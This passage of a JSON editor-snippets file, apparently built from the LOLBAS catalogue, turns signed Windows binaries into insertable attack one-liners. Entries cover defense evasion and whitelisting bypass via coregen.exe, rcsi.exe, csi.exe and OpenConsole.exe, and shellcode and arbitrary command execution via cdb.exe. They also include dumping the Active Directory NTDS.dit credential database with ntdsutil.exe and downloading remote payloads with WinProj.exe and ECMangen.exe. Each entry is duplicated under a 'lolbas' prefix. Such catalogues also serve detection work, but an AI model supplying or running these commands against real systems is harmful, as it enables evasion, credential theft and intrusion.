            "te.exe {PATH:.dll}${0}",
            "```"
        ],
        "description": "te.exe is Testing tool included with Microsoft Test Authoring and Execution Framework (TAEF).. it can Execute commands from a DLL file with Test Authoring and Execution Framework (TAEF) tests. See resources section for required structures., requires  privilege, category: Execute, it can be used for Execute DLL file.."
    },
    "XBootMgrSleep.exe Performs execution of specified executable, can be used as a defense evasion (lolbas)": {
        "prefix": "XBootMgrSleep.exe",
        "body": [
            "XBootMgrSleep.exe is Windows Performance Toolkit binary used for tracing and analyzing system performance during sleep and resume transitions.. it can Execute executable via XBootMgrSleep, with a 1 second (=1000 milliseconds) delay. Alternatively, it is also possible to replace the delay with any string for immediate execution., requires  privilege, category: Execute, it can be used for Performs execution of specified executable, can be used as a defense evasion.",
            "",
            "```sh",
            "xbootmgrsleep.exe 1000 {PATH:.exe}${0}",
            "```"
        ],
        "description": "XBootMgrSleep.exe is Windows Performance Toolkit binary used for tracing and analyzing system performance during sleep and resume transitions.. it can Execute executable via XBootMgrSleep, with a 1 second (=1000 milliseconds) delay. Alternatively, it is also possible to replace the delay with any string for immediate execution., requires  privilege, category: Execute, it can be used for Performs execution of specified executable, can be used as a defense evasion."
    },
    "lolbas XBootMgrSleep.exe Performs execution of specified executable, can be used as a defense evasion": {
        "prefix": "lolbas XBootMgrSleep.exe",
        "body": [
            "XBootMgrSleep.exe is Windows Performance Toolkit binary used for tracing and analyzing system performance during sleep and resume transitions.. it can Execute executable via XBootMgrSleep, with a 1 second (=1000 milliseconds) delay. Alternatively, it is also possible to replace the delay with any string for immediate execution., requires  privilege, category: Execute, it can be used for Performs execution of specified executable, can be used as a defense evasion.",
            "",
            "```sh",
            "xbootmgrsleep.exe 1000 {PATH:.exe}${0}",
            "```"
        ],
        "description": "XBootMgrSleep.exe is Windows Performance Toolkit binary used for tracing and analyzing system performance during sleep and resume transitions.. it can Execute executable via XBootMgrSleep, with a 1 second (=1000 milliseconds) delay. Alternatively, it is also possible to replace the delay with any string for immediate execution., requires  privilege, category: Execute, it can be used for Performs execution of specified executable, can be used as a defense evasion."
    },
    "coregen.exe Execute DLL code (lolbas)": {
        "prefix": "coregen.exe",
        "body": [
            "coregen.exe is Binary coregen.exe (Microsoft CoreCLR Native Image Generator) loads exported function GetCLRRuntimeHost from coreclr.dll or from .DLL in arbitrary path. Coregen is located within \"C:\\Program Files (x86)\\Microsoft Silverlight\\5.1.50918.0\\\" or another version of Silverlight. Coregen is signed by Microsoft and bundled with Microsoft Silverlight.. it can Loads the target .DLL in arbitrary path specified with /L. Since binary is signed it can also be used to bypass application whitelisting solutions., requires  privilege, category: AWL Bypass, it can be used for Execute DLL code.",
            "",
            "```sh",
            "coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name${0}",
            "```"
        ],
        "description": "coregen.exe is Binary coregen.exe (Microsoft CoreCLR Native Image Generator) loads exported function GetCLRRuntimeHost from coreclr.dll or from .DLL in arbitrary path. Coregen is located within \"C:\\Program Files (x86)\\Microsoft Silverlight\\5.1.50918.0\\\" or another version of Silverlight. Coregen is signed by Microsoft and bundled with Microsoft Silverlight.. it can Loads the target .DLL in arbitrary path specified with /L. Since binary is signed it can also be used to bypass application whitelisting solutions., requires  privilege, category: AWL Bypass, it can be used for Execute DLL code."
    },
    "lolbas coregen.exe Execute DLL code": {
        "prefix": "lolbas coregen.exe",
        "body": [
            "coregen.exe is Binary coregen.exe (Microsoft CoreCLR Native Image Generator) loads exported function GetCLRRuntimeHost from coreclr.dll or from .DLL in arbitrary path. Coregen is located within \"C:\\Program Files (x86)\\Microsoft Silverlight\\5.1.50918.0\\\" or another version of Silverlight. Coregen is signed by Microsoft and bundled with Microsoft Silverlight.. it can Loads the target .DLL in arbitrary path specified with /L. Since binary is signed it can also be used to bypass application whitelisting solutions., requires  privilege, category: AWL Bypass, it can be used for Execute DLL code.",
            "",
            "```sh",
            "coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name${0}",
            "```"
        ],
        "description": "coregen.exe is Binary coregen.exe (Microsoft CoreCLR Native Image Generator) loads exported function GetCLRRuntimeHost from coreclr.dll or from .DLL in arbitrary path. Coregen is located within \"C:\\Program Files (x86)\\Microsoft Silverlight\\5.1.50918.0\\\" or another version of Silverlight. Coregen is signed by Microsoft and bundled with Microsoft Silverlight.. it can Loads the target .DLL in arbitrary path specified with /L. Since binary is signed it can also be used to bypass application whitelisting solutions., requires  privilege, category: AWL Bypass, it can be used for Execute DLL code."
    },
    "rcsi.exe Local execution of arbitrary C# code stored in local CSX file. (lolbas)": {
        "prefix": "rcsi.exe",
        "body": [
            "rcsi.exe is Non-Interactive command line inerface included with Visual Studio.. it can Use embedded C# within the csx script to execute the code., requires  privilege, category: AWL Bypass, it can be used for Local execution of arbitrary C# code stored in local CSX file..",
            "",
            "```sh",
            "rcsi.exe {PATH:.csx}${0}",
            "```"
        ],
        "description": "rcsi.exe is Non-Interactive command line inerface included with Visual Studio.. it can Use embedded C# within the csx script to execute the code., requires  privilege, category: AWL Bypass, it can be used for Local execution of arbitrary C# code stored in local CSX file.."
    },
    "lolbas rcsi.exe Local execution of arbitrary C# code stored in local CSX file.": {
        "prefix": "lolbas rcsi.exe",
        "body": [
            "rcsi.exe is Non-Interactive command line inerface included with Visual Studio.. it can Use embedded C# within the csx script to execute the code., requires  privilege, category: AWL Bypass, it can be used for Local execution of arbitrary C# code stored in local CSX file..",
            "",
            "```sh",
            "rcsi.exe {PATH:.csx}${0}",
            "```"
        ],
        "description": "rcsi.exe is Non-Interactive command line inerface included with Visual Studio.. it can Use embedded C# within the csx script to execute the code., requires  privilege, category: AWL Bypass, it can be used for Local execution of arbitrary C# code stored in local CSX file.."
    },
    "ntdsutil.exe Dumping of Active Directory NTDS.dit database (lolbas)": {
        "prefix": "ntdsutil.exe",
        "body": [
            "ntdsutil.exe is Command line utility used to export Active Directory.. it can Dump NTDS.dit into folder, requires  privilege, category: Dump, it can be used for Dumping of Active Directory NTDS.dit database.",
            "",
            "```sh",
            "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\\" q q${0}",
            "```"
        ],
        "description": "ntdsutil.exe is Command line utility used to export Active Directory.. it can Dump NTDS.dit into folder, requires  privilege, category: Dump, it can be used for Dumping of Active Directory NTDS.dit database."
    },
    "lolbas ntdsutil.exe Dumping of Active Directory NTDS.dit database": {
        "prefix": "lolbas ntdsutil.exe",
        "body": [
            "ntdsutil.exe is Command line utility used to export Active Directory.. it can Dump NTDS.dit into folder, requires  privilege, category: Dump, it can be used for Dumping of Active Directory NTDS.dit database.",
            "",
            "```sh",
            "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\\" q q${0}",
            "```"
        ],
        "description": "ntdsutil.exe is Command line utility used to export Active Directory.. it can Dump NTDS.dit into folder, requires  privilege, category: Dump, it can be used for Dumping of Active Directory NTDS.dit database."
    },
    "csi.exe Local execution of unsigned C# code. (lolbas)": {
        "prefix": "csi.exe",
        "body": [
            "csi.exe is Command line interface included with Visual Studio.. it can Use csi.exe to run unsigned C# code., requires  privilege, category: Execute, it can be used for Local execution of unsigned C# code..",
            "",
            "```sh",
            "csi.exe {PATH:.cs}${0}",
            "```"
        ],
        "description": "csi.exe is Command line interface included with Visual Studio.. it can Use csi.exe to run unsigned C# code., requires  privilege, category: Execute, it can be used for Local execution of unsigned C# code.."
    },
    "lolbas csi.exe Local execution of unsigned C# code.": {
        "prefix": "lolbas csi.exe",
        "body": [
            "csi.exe is Command line interface included with Visual Studio.. it can Use csi.exe to run unsigned C# code., requires  privilege, category: Execute, it can be used for Local execution of unsigned C# code..",
            "",
            "```sh",
            "csi.exe {PATH:.cs}${0}",
            "```"
        ],
        "description": "csi.exe is Command line interface included with Visual Studio.. it can Use csi.exe to run unsigned C# code., requires  privilege, category: Execute, it can be used for Local execution of unsigned C# code.."
    },
    "WinProj.exe It will download a remote payload and place it in INetCache. (lolbas)": {
        "prefix": "WinProj.exe",
        "body": [
            "WinProj.exe is Microsoft Project Executable. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache..",
            "",
            "```sh",
            "WinProj.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "WinProj.exe is Microsoft Project Executable. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache.."
    },
    "lolbas WinProj.exe It will download a remote payload and place it in INetCache.": {
        "prefix": "lolbas WinProj.exe",
        "body": [
            "WinProj.exe is Microsoft Project Executable. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache..",
            "",
            "```sh",
            "WinProj.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "WinProj.exe is Microsoft Project Executable. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache.."
    },
    "OpenConsole.exe Use OpenConsole.exe as a proxy binary to evade defensive counter-measures (lolbas)": {
        "prefix": "OpenConsole.exe",
        "body": [
            "OpenConsole.exe is Console Window host for Windows Terminal. it can Execute specified process with OpenConsole.exe as parent process, requires  privilege, category: Execute, it can be used for Use OpenConsole.exe as a proxy binary to evade defensive counter-measures.",
            "",
            "```sh",
            "OpenConsole.exe {PATH:.exe}${0}",
            "```"
        ],
        "description": "OpenConsole.exe is Console Window host for Windows Terminal. it can Execute specified process with OpenConsole.exe as parent process, requires  privilege, category: Execute, it can be used for Use OpenConsole.exe as a proxy binary to evade defensive counter-measures."
    },
    "lolbas OpenConsole.exe Use OpenConsole.exe as a proxy binary to evade defensive counter-measures": {
        "prefix": "lolbas OpenConsole.exe",
        "body": [
            "OpenConsole.exe is Console Window host for Windows Terminal. it can Execute specified process with OpenConsole.exe as parent process, requires  privilege, category: Execute, it can be used for Use OpenConsole.exe as a proxy binary to evade defensive counter-measures.",
            "",
            "```sh",
            "OpenConsole.exe {PATH:.exe}${0}",
            "```"
        ],
        "description": "OpenConsole.exe is Console Window host for Windows Terminal. it can Execute specified process with OpenConsole.exe as parent process, requires  privilege, category: Execute, it can be used for Use OpenConsole.exe as a proxy binary to evade defensive counter-measures."
    },
    "Cdb.exe Local execution of assembly shellcode. (lolbas)": {
        "prefix": "Cdb.exe",
        "body": [
            "Cdb.exe is Debugging tool included with Windows Debugging Tools.. it can Launch 64-bit shellcode from the specified .wds file using cdb.exe., requires  privilege, category: Execute, it can be used for Local execution of assembly shellcode..",
            "",
            "```sh",
            "cdb.exe -cf {PATH:.wds} -o notepad.exe${0}",
            "```"
        ],
        "description": "Cdb.exe is Debugging tool included with Windows Debugging Tools.. it can Launch 64-bit shellcode from the specified .wds file using cdb.exe., requires  privilege, category: Execute, it can be used for Local execution of assembly shellcode.."
    },
    "lolbas Cdb.exe Local execution of assembly shellcode.": {
        "prefix": "lolbas Cdb.exe",
        "body": [
            "Cdb.exe is Debugging tool included with Windows Debugging Tools.. it can Launch 64-bit shellcode from the specified .wds file using cdb.exe., requires  privilege, category: Execute, it can be used for Local execution of assembly shellcode..",
            "",
            "```sh",
            "cdb.exe -cf {PATH:.wds} -o notepad.exe${0}",
            "```"
        ],
        "description": "Cdb.exe is Debugging tool included with Windows Debugging Tools.. it can Launch 64-bit shellcode from the specified .wds file using cdb.exe., requires  privilege, category: Execute, it can be used for Local execution of assembly shellcode.."
    },
    "Cdb.exe Run a shell command under a trusted Microsoft signed binary (lolbas)": {
        "prefix": "Cdb.exe",
        "body": [
            "Cdb.exe is Debugging tool included with Windows Debugging Tools.. it can Attaching to any process and executing shell commands., requires  privilege, category: Execute, it can be used for Run a shell command under a trusted Microsoft signed binary.",
            "",
            "```sh",
            "cdb.exe -pd -pn {process_name}\n.shell {CMD}\n${0}",
            "```"
        ],
        "description": "Cdb.exe is Debugging tool included with Windows Debugging Tools.. it can Attaching to any process and executing shell commands., requires  privilege, category: Execute, it can be used for Run a shell command under a trusted Microsoft signed binary."
    },
    "lolbas Cdb.exe Run a shell command under a trusted Microsoft signed binary": {
        "prefix": "lolbas Cdb.exe",
        "body": [
            "Cdb.exe is Debugging tool included with Windows Debugging Tools.. it can Attaching to any process and executing shell commands., requires  privilege, category: Execute, it can be used for Run a shell command under a trusted Microsoft signed binary.",
            "",
            "```sh",
            "cdb.exe -pd -pn {process_name}\n.shell {CMD}\n${0}",
            "```"
        ],
        "description": "Cdb.exe is Debugging tool included with Windows Debugging Tools.. it can Attaching to any process and executing shell commands., requires  privilege, category: Execute, it can be used for Run a shell command under a trusted Microsoft signed binary."
    },
    "Cdb.exe Run commands under a trusted Microsoft signed binary (lolbas)": {
        "prefix": "Cdb.exe",
        "body": [
            "Cdb.exe is Debugging tool included with Windows Debugging Tools.. it can Execute arbitrary commands and binaries using a debugging script (see Resources section for a sample file)., requires  privilege, category: Execute, it can be used for Run commands under a trusted Microsoft signed binary.",
            "",
            "```sh",
            "cdb.exe -c {PATH:.txt} \"{CMD}\"${0}",
            "```"
        ],
        "description": "Cdb.exe is Debugging tool included with Windows Debugging Tools.. it can Execute arbitrary commands and binaries using a debugging script (see Resources section for a sample file)., requires  privilege, category: Execute, it can be used for Run commands under a trusted Microsoft signed binary."
    },
    "lolbas Cdb.exe Run commands under a trusted Microsoft signed binary": {
        "prefix": "lolbas Cdb.exe",
        "body": [
            "Cdb.exe is Debugging tool included with Windows Debugging Tools.. it can Execute arbitrary commands and binaries using a debugging script (see Resources section for a sample file)., requires  privilege, category: Execute, it can be used for Run commands under a trusted Microsoft signed binary.",
            "",
            "```sh",
            "cdb.exe -c {PATH:.txt} \"{CMD}\"${0}",
            "```"
        ],
        "description": "Cdb.exe is Debugging tool included with Windows Debugging Tools.. it can Execute arbitrary commands and binaries using a debugging script (see Resources section for a sample file)., requires  privilege, category: Execute, it can be used for Run commands under a trusted Microsoft signed binary."
    },
    "ECMangen.exe It will download a remote payload and place it in INetCache (lolbas)": {
        "prefix": "ECMangen.exe",
        "body": [
            "ECMangen.exe is Command-line tool for managing certificates in Microsoft Exchange Server.. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache.",
            "",
            "```sh",
            "ECMangen.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "ECMangen.exe is Command-line tool for managing certificates in Microsoft Exchange Server.. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache."
    },
    "lolbas ECMangen.exe It will download a remote payload and place it in INetCache": {
        "prefix": "lolbas ECMangen.exe",
        "body": [
            "ECMangen.exe is Command-line tool for managing certificates in Microsoft Exchange Server.. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache.",
            "",
            "```sh",
            "ECMangen.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "ECMangen.exe is Command-line tool for managing certificates in Microsoft Exchange Server.. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache."
    }
}